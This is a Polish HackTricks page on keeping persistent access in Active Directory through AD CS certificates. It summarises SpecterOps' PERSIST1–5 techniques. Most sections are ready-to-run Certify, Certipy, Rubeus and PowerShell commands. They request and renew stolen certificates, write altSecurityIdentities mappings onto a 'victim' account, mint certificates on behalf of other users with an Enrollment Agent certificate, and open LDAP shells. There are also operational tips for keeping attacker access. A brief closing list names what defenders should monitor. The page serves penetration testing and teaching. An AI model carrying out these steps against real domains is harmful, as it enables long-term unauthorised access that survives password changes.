# Utrwalanie konta w AD CS

{{#include ../../../banners/hacktricks-training.md}}

**To krótkie podsumowanie rozdziałów dotyczących utrwalania kont z doskonałego opracowania [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Understanding Active User Credential Theft with Certificates – PERSIST1

W scenariuszu, w którym użytkownik może zażądać certyfikatu umożliwiającego uwierzytelnianie w domenie, atakujący może zażądać i wykraść ten certyfikat, aby utrzymać persistence w sieci. Domyślnie szablon `User` w Active Directory zezwala na takie żądania, choć czasami może to być wyłączone.<sup>[[3]](#references)[[7]](#references)</sup>

Za pomocą [Certify](https://github.com/GhostPack/Certify) lub [Certipy](https://github.com/ly4k/Certipy) można wyszukać włączone szablony, które umożliwiają uwierzytelnianie klienta, a następnie zażądać takiego certyfikatu:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Siła certyfikatu polega na możliwości uwierzytelniania się jako użytkownik, do którego należy, niezależnie od zmian hasła, dopóki certyfikat pozostaje ważny.

Możesz przekonwertować PEM do PFX i użyć go do uzyskania TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Uwaga: W połączeniu z innymi technikami (zobacz sekcje THEFT) uwierzytelnianie oparte na certyfikatach umożliwia trwały dostęp bez uzyskiwania dostępu do LSASS, nawet z kontekstów bez podwyższonych uprawnień.

## Uzyskiwanie trwałości na maszynie za pomocą certyfikatów - PERSIST2

Jeśli atakujący ma podwyższone uprawnienia na hoście, może zarejestrować konto maszyny zaatakowanego systemu w celu uzyskania certyfikatu przy użyciu domyślnego szablonu `Machine`. Uwierzytelnianie jako maszyna umożliwia S4U2Self dla usług lokalnych i może zapewnić trwałość na hoście:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Rozszerzanie Persistence poprzez odnowienie certyfikatu - PERSIST3

Wykorzystywanie okresów ważności i odnowienia certificate templates pozwala atakującemu utrzymać długoterminowy dostęp. Jeśli posiadasz wcześniej wydany certificate i jego private key, możesz odnowić go przed wygaśnięciem, aby uzyskać świeży, długoterminowy credential bez pozostawiania dodatkowych artefaktów żądania powiązanych z pierwotnym principalem.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Wskazówka operacyjna: Śledź okresy ważności plików PFX znajdujących się w rękach atakującego i odnawiaj je z wyprzedzeniem. Odnowienie może również spowodować, że zaktualizowane certyfikaty będą zawierać nowoczesne rozszerzenie mapowania SID, dzięki czemu pozostaną użyteczne przy bardziej rygorystycznych regułach mapowania DC (zobacz następną sekcję).

## Umieszczanie jawnych mapowań certyfikatów (altSecurityIdentities) – PERSIST4

Jeśli możesz zapisywać atrybut `altSecurityIdentities` konta docelowego, możesz jawnie zmapować kontrolowany przez atakującego certyfikat na to konto. Takie mapowanie pozostaje aktywne po zmianie hasła, a przy użyciu silnych formatów mapowania nadal działa przy nowoczesnym egzekwowaniu reguł przez DC.<sup>[[2]](#references)</sup>

Przepływ na wysokim poziomie:

1. Uzyskaj lub wystaw kontrolowany przez siebie certyfikat do uwierzytelniania klienta (np. zarejestruj się w szablonie `User` jako własne konto).
2. Wyodrębnij z certyfikatu silny identyfikator (Issuer+Serial, SKI lub SHA1-PublicKey).
3. Dodaj jawne mapowanie na obiekcie ofiary w atrybucie `altSecurityIdentities`, używając tego identyfikatora.
4. Uwierzytelnij się za pomocą certyfikatu; DC zmapuje go na konto ofiary poprzez jawne mapowanie.

Przykład (PowerShell) wykorzystujący silne mapowanie Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Następnie uwierzytelnij się za pomocą swojego PFX. Certipy bezpośrednio uzyska TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Tworzenie silnych mapowań `altSecurityIdentities`

W praktyce mapowania **Issuer+Serial** i **SKI** to najłatwiejsze silne formaty do utworzenia na podstawie certyfikatu znajdującego się w posiadaniu atakującego. Ma to znaczenie po **11 lutego 2025 r.**, gdy kontrolery domeny domyślnie przejdą do trybu **Full Enforcement**, a słabe mapowania przestaną być niezawodne.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Uwagi
- Używaj wyłącznie silnych typów mapowania: `X509IssuerSerialNumber`, `X509SKI` lub `X509SHA1PublicKey`. Słabe formaty (Subject/Issuer, tylko Subject, adres e-mail RFC822) są przestarzałe i mogą być blokowane przez policy kontrolera domeny.
- Mapowanie działa zarówno na obiektach **user**, jak i **computer**, więc dostęp do zapisu właściwości `altSecurityIdentities` konta komputera wystarczy, aby utrzymać się jako ta maszyna.
- Łańcuch certyfikatów musi prowadzić do root CA zaufanego przez DC. Enterprise CA znajdujące się w NTAuth są zazwyczaj zaufane; w niektórych środowiskach zaufane są również publiczne CA.
- Uwierzytelnianie Schannel pozostaje przydatne do persistence nawet wtedy, gdy PKINIT zawodzi, ponieważ DC nie ma EKU Smart Card Logon lub zwraca `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### Jawne mapowania `Issuer/SID` w wersji 2025+

Na kontrolerach domeny **Windows Server 2022+** z zainstalowaną aktualizacją bezpieczeństwa firmy Microsoft z **9 września 2025 r.** dodano kolejny silny format jawnego mapowania, atrakcyjny do persistence, ponieważ zachowuje działanie po ponownym wydaniu certyfikatu przez ten sam CA:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operacyjnie różni się to od starszych silnych formatów:
- `Issuer+Serial` przypisuje **jeden konkretny certyfikat**.
- `SKI` / `SHA1-PUKEY` przypisują **jedną parę kluczy**.
- `Issuer/SID` przypisuje **wystawiający CA + docelowy SID**, dzięki czemu odnowione lub ponownie wystawione certyfikaty z tego samego CA nadal działają bez przepisywania `altSecurityIdentities`.

Wymagania i zastrzeżenia
- Certyfikat przedstawiony podczas logowania musi faktycznie zawierać SID docelowego konta w rozszerzeniu zabezpieczeń SID.
- Ten format nie jest pomocny w przypadku certyfikatów w stylu `ESC9` / `ESC16`, które pomijają rozszerzenie SID; w takich przypadkach użyj `Issuer+Serial`, `SKI` lub `SHA1-PUKEY`.

Więcej informacji o słabych jawnych mapowaniach i ścieżkach ataku znajdziesz tutaj:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Jeśli uzyskasz prawidłowy certyfikat Certificate Request Agent/Enrollment Agent, możesz według uznania tworzyć nowe certyfikaty umożliwiające logowanie w imieniu użytkowników i przechowywać agentowy PFX offline jako token persistence. Workflow nadużycia:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Unieważnienie certyfikatu agenta lub uprawnień szablonu jest wymagane, aby usunąć tę persistence.

Uwagi operacyjne
- Nowoczesne wersje `Certipy` obsługują zarówno `-on-behalf-of`, jak i `-renew`, dzięki czemu attacker posiadający Enrollment Agent PFX może wystawiać, a następnie odnawiać leaf certificates bez ponownego uzyskiwania dostępu do pierwotnego konta docelowego.<sup>[[4]](#references)</sup>
- Jeśli pobranie TGT oparte na PKINIT nie jest możliwe, uzyskany on-behalf-of certificate nadal może być używany do uwierzytelniania Schannel za pomocą `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Używanie utrwalonych certyfikatów, gdy PKINIT zawodzi

Jeśli DC nie ma certyfikatu obsługującego Smart Card Logon, logowanie certyfikatem przez PKINIT może zakończyć się błędem `KDC_ERR_PADATA_TYPE_NOSUPP`. Nie eliminuje to mechanizmu persistence: ten sam PFX często nadal może być używany do uwierzytelnionego przez Schannel dostępu LDAP.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Jest to szczególnie przydatne po PERSIST4/PERSIST5, ponieważ możesz nadal działać z systemu Linux/macOS i łączyć inne działania persistence w katalogu, takie jak umieszczanie [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) lub edytowanie atrybutów delegowania z możliwością zapisu.

## 2025 Strong Certificate Mapping Enforcement: wpływ na persistence

Microsoft KB5014754 wprowadził Strong Certificate Mapping Enforcement na kontrolerach domeny. Od **11 lutego 2025 r.** kontrolery domeny domyślnie stosują **Full Enforcement** dla słabych/niejednoznacznych mapowań, a od aktualizacji zabezpieczeń z **9 września 2025 r.** zaktualizowane kontrolery domeny nie obsługują już starego mechanizmu awaryjnego w trybie Compatibility.<sup>[[1]](#references)</sup> Praktyczne konsekwencje:

- Certyfikaty sprzed 2022 r., które nie zawierają rozszerzenia mapowania SID, mogą nie przejść mapowania niejawnego, gdy kontrolery domeny działają w trybie Full Enforcement. Atakujący mogą utrzymać dostęp, odnawiając certyfikaty za pośrednictwem AD CS (aby uzyskać rozszerzenie SID) albo umieszczając silne jawne mapowanie w `altSecurityIdentities` (PERSIST4).
- Jawne mapowania wykorzystujące silne formaty (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` oraz `Issuer/SID` na nowoczesnych kontrolerach domeny) nadal działają. Słabe formaty (Issuer/Subject, tylko Subject, RFC822) mogą być blokowane i należy ich unikać w persistence.
- Jeśli słabe mapowania nadal wydają się działać, załóż, że trafiłeś na niezałatany lub inaczej skonfigurowany kontroler domeny, a nie na niezawodną ścieżkę długoterminowego persistence.
- Ścieżki wydawania w stylu `ESC9` / `ESC16`, które pomijają rozszerzenie SID, uniemożliwiają użycie `Issuer/SID`, dlatego praktyczną opcją persistence stają się zastępcze silne mapowania lub odnowienie za pośrednictwem zwykłego szablonu.

Administratorzy powinni monitorować i generować alerty dotyczące:
- Zmian atrybutu `altSecurityIdentities` oraz wystawiania/odnawiania certyfikatów Enrollment Agent i User.
- Dzienników wystawiania CA dotyczących żądań w imieniu innych użytkowników oraz nietypowych wzorców odnawiania.

## References

- [1] [Microsoft Support – KB5014754: Zmiany uwierzytelniania opartego na certyfikatach na kontrolerach domeny Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – technika nadużycia ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – techniki Account Persistence](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – uwierzytelnianie za pomocą certyfikatów, gdy PKINIT nie jest obsługiwane](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – przedstawienie nowego Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: nadużywanie Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
